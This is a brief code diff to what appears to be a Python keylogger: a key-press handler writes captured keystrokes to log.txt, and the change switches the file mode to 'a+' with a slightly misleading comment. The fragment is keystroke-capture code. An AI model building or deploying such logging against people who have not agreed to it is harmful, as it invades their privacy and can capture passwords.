@@ -16,8 +16,8 @@ def on_press(key):
 
 
 def write_file(keys):
-    # 'a' mode opens the file for appending
-    with open('log.txt', 'a') as f:
+    # 'a+' mode leaves the new file open for appending
+    with open('log.txt', 'a+') as f:
         for key in keys:
             # Removing '' from the key string
             k = str(key).replace("'", "")
